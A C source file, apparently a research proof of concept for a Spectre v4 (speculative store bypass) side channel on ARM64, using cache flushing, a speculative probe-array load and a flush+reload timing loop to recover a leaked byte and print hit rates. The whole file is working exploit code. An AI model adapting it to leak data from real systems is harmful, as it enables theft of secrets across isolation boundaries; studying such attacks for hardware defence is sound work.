#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include "utils.h"

#define LEN 16
#define MAX_TRIES 2000
#define CACHE_HIT_THRESHOLD 190
#define REPEAT_16(x) x x x x x x x x x x x x x x x x
#define REPEAT_10(x) x x x x x x x x x x 

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define EORS(n) \
    asm volatile( \
        ".rept %0\n" \
        "eor x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		: "x10" \
    )



unsigned char memory[100];
unsigned char index2 = 8;
unsigned char *miss;
static unsigned char *miss_ptr1 __attribute__((aligned(4096)));
static unsigned char **miss_ptr2 __attribute__((aligned(4096))) = &miss_ptr1;
static unsigned char ***miss_ptr3 __attribute__((aligned(4096))) = &miss_ptr2;
static unsigned char cache_miss = 8;
uint8_t *probe;
volatile uint8_t tmp = 0;


static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
	register uint64_t  access = 8;
	register uint64_t  id = 8;
	double num = 0.0;
	isb();
	memory[cache_miss] = 8;
	NOPS(100);
	tmp = probe[memory[8] << 12];
}


static inline __attribute__((always_inline)) void attacker_function(int idx) {
	int access_index = 0;


		int results[256] = {0};
		volatile unsigned char pick = 0;
		for (int tries = 0; tries < MAX_TRIES; tries++) {

			memset(memory, 0x1, sizeof(uint32_t) * 10);
			cacheflush(&cache_miss);
			for (int i = 0; i < 256; i++) {
				cacheflush(&probe[i * 4096]);
			}
			isb();
#ifdef N
			NOPS(N);
#endif

			spectre_v4(idx);

			for (int i = 0; i < 256; i++) {
				access_index = ((i * 167) + 13) & 255;
				isb();
				uint64_t time1 = get_cycles(); // read timer
				pick = probe[access_index << 12]; // memory access to time
				uint64_t time2 = get_cycles() - time1; // read timer and compute elapsed time
				isb();

				if (time2 <= CACHE_HIT_THRESHOLD && access_index != 8){
					results[access_index]++; // cache hit
				}
			}
		}
		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("highest:%c, %d, hitrate:%f\n", highest, highest,
			(double)results[highest] * 100 / MAX_TRIES);
}


int main(void) {
	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	miss = (unsigned char *)mmap(0, 100, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	
	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
	memset(miss, 8, sizeof(uint8_t) * 100);

	miss_ptr1 = &miss[0];
	int idx = 0;
	REPEAT_10(
	attacker_function(idx);
	idx ++;
	)

}
